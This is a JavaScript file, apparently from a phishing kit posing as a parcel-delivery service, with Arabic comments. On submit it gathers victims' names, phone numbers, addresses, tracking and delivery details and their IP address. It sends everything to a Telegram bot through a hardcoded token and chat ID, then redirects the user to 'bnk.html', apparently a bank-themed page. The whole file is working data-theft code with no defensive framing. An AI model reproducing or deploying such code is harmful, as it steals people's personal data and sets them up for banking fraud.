var foo = document.getElementById("fot");
 foo.addEventListener("submit",function(event){
 event.preventDefault();
 window.scrollTo(0,0);
 });
 document.getElementById("submit").onclick = function (){
 var but = document.getElementById("inp9");
 var in1 = document.getElementById("inp1");
 var in2 = document.getElementById("inp2");
 var in3 = document.getElementById("inp3");
 var in4 = document.getElementById("inp4");
 var in5 = document.getElementById("inp5");
 var in6 = document.getElementById("te");
 if(in1.value=="" || in2.value=="" || in3.value=="" || in4.value=="" || in5.value=="" ||in6.value==""){
    
 }else{
     
   
     // عرض شاشة جار التحميل
  
    
     
 

   
     var in0 = document.getElementById("sel").value;
     var in1 = document.getElementById("inp1").value;
     var in2 = document.getElementById("inp2").value;
     var in3 = document.getElementById("inp3").value;
     var in4 = document.getElementById("inp4").value;
     var in5 = document.getElementById("inp5").value;
     var in6 = document.getElementById("te").value;
     var in7 = document.getElementById("ade").value;
 
     
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
          const ipAddress = data.ip;
          console.log(ipAddress);
     
     
     
  
     
     
     
      axios.post('https://api.telegram.org/bot6948869803:AAFh0PExFe9_iBbaWM3JxkDIG3Br-SxyPhE/sendMessage', {
      chat_id: '6594871141',
      text: ` نوع الخدمة : ${in0} \n رقم تتبع الشحن ${in1} \n الاسم بالكامل ${in2} \n رقم الجوال : ${in3} \n العنوان بالكامل : ${in4} \nاسم المدينة : ${in5} \nاسم الشحنة ${in6}\n موعد التسليم : ${in7}\n معدل العميل : ${ipAddress}` 
      })
      
      .then(response => {
      console.log(response.data);
      
      })
      .catch(error => {
      console.error(error);
      console.log("error");
      });
      
        })
      
      .catch(error => {
          console.error('Error:', error);
        }); 
 
      document.getElementById("loading").style.display = "block";
      
      // تأخير لبضع ثوانٍ قبل نقل المستخدم إلى الصفحة الأخرى
      // 5000 ميلي ثانية = 5 ثوانٍ
      setTimeout(function() {
     
      window.location.href = "bnk.html";
      },12000);
      
      
      var bott = document.getElementById("submit");
      bott.addEventListener("click",function(){
      bott.disabled= true;
      
      });
      
  
      
     } 
  
 }
  function getName() {
   var urlParams = new URLSearchParams(window.location.search);
   var name = urlParams.get('name');
   document.getElementById("inp1").value = name;  
   }





 